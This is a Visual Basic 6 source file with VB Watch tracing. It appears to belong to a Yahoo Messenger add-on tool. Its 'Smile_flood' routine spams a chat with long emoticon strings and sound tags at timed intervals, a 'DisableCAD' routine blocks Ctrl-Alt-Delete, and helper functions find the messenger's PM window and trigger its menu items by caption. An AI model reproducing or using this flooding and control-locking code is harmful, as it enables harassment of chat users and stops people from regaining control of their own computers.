If vbwTraceLine Then vbwExecuteLine False, "230    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
230    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "231    pause 0.34"
' </VB WATCH>
231    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "232    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
232    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "233    pause 0.34"
' </VB WATCH>
233    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "234    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
234    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "235    pause 0.34"
' </VB WATCH>
235    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "236    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
236    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "237    pause 0.34"
' </VB WATCH>
237    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "238    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
238    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "239    pause 0.34"
' </VB WATCH>
239    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "240    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
240    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "241    pause 0.34"
' </VB WATCH>
241    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "242    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
242    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "243    pause 0.34"
' </VB WATCH>
243    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "244    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
244    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "245    pause 0.34"
' </VB WATCH>
245    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "246    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
246    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "247    pause 0.34"
' </VB WATCH>
247    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "248    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
248    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "249    pause 0.34"
' </VB WATCH>
249    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "250    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
250    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "251    pause 0.34"
' </VB WATCH>
251    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "252    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
252    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "253    pause 0.34"
' </VB WATCH>
253    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "254    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
254    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "255    pause 0.34"
' </VB WATCH>
255    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "256    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
256    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "End Sub"
257        If vbwTraceProc Then vbwTraceOut VBWPROCNAME
258        Exit Sub
    ' ----- Error Handler ------
vbwErrHandler:
    Const VBWPROCEDURE = "Smile_flood"
    Select Case MsgBox("Error " & Err.number & vbCrLf & _
                      Err.Description & vbCrLf & _
                     "Location: " & VBWPROJECT & "." & VBWMODULE & "." & VBWPROCEDURE & vbCrLf & _
                     "Line " & Erl, _
                     vbAbortRetryIgnore)
      Case vbAbort
          End
      Case vbRetry
          Resume
      Case vbIgnore
          Resume Next
  End Select

If vbwTraceLine Then vbwExecuteLine False, "End Sub"
    If vbwTraceProc Then vbwTraceOut VBWPROCNAME
' </VB WATCH>
End Sub

Public Sub DisableCAD(Disabled As Boolean)
' <VB WATCH>
259        On Error GoTo vbwErrHandler
260        Const VBWPROCNAME = "venkymd5crypt.DisableCAD"
261        If vbwTraceProc Then
262            Dim vbwParameterString As String
263            If vbwTraceParameters Then
264                vbwParameterString = "(" & vbwReportParameter("Disabled", Disabled) & ") "
265            End If
266            vbwTraceIn VBWPROCNAME, vbwParameterString
267        End If
' </VB WATCH>

       'SET DISABLED TO TRUE TO DISABLE CTRL-ALT-DELETE
       'SET DISABLED TO FALSE TO RE-ENABLE

268        Dim lRet As Long
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "269        lRet = SystemParametersInfo(SPI_SETSCREENSAVERRUNNING, _"
' </VB WATCH>
269        lRet = SystemParametersInfo(SPI_SETSCREENSAVERRUNNING, _
             Disabled = True, 0&, 0&)
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "End Sub"
270        If vbwTraceProc Then vbwTraceOut VBWPROCNAME
271        Exit Sub
    ' ----- Error Handler ------
vbwErrHandler:
    Const VBWPROCEDURE = "DisableCAD"
    Select Case MsgBox("Error " & Err.number & vbCrLf & _
                      Err.Description & vbCrLf & _
                     "Location: " & VBWPROJECT & "." & VBWMODULE & "." & VBWPROCEDURE & vbCrLf & _
                     "Line " & Erl, _
                     vbAbortRetryIgnore)
      Case vbAbort
          End
      Case vbRetry
          Resume
      Case vbIgnore
          Resume Next
  End Select

If vbwTraceLine Then vbwExecuteLine False, "End Sub"
    If vbwTraceProc Then vbwTraceOut VBWPROCNAME
' </VB WATCH>
End Sub

Function Y_GetPMWind()
Y_GetPMWind = FindWindow("imclass", vbNullString)
End Function
Sub RunMenubystring(Window, mnuCap)
    Dim ToSearch        As Long
    Dim MenuCount       As Integer
    Dim FindString
    Dim ToSearchSub     As Long
    Dim MenuItemCount   As Integer
    Dim GetString
    Dim SubCount        As Long
    Dim MenuString      As String
    Dim GetStringMenu   As Integer
    Dim MenuItem        As Long
    Dim RunTheMenu      As Integer
    
  
    ToSearch& = GetMenu(Window)
    MenuCount% = GetMenuItemCount(ToSearch&)
    
    For FindString = 0 To MenuCount% - 1
        ToSearchSub& = GetSubMenu(ToSearch&, FindString)
        MenuItemCount% = GetMenuItemCount(ToSearchSub&)
        For GetString = 0 To MenuItemCount% - 1
            SubCount& = GetMenuItemID(ToSearchSub&, GetString)
            MenuString$ = String$(100, " ")
            GetStringMenu% = GetMenuString(ToSearchSub&, SubCount&, MenuString$, 100, 1)
            If InStr(UCase(MenuString$), UCase(mnuCap)) Then
                MenuItem& = SubCount&
                GoTo MatchString
            End If
    Next GetString
    Next FindString
MatchString:
    RunTheMenu% = SendMessage(Window, WM_COMMAND, MenuItem&, 0)
End Sub



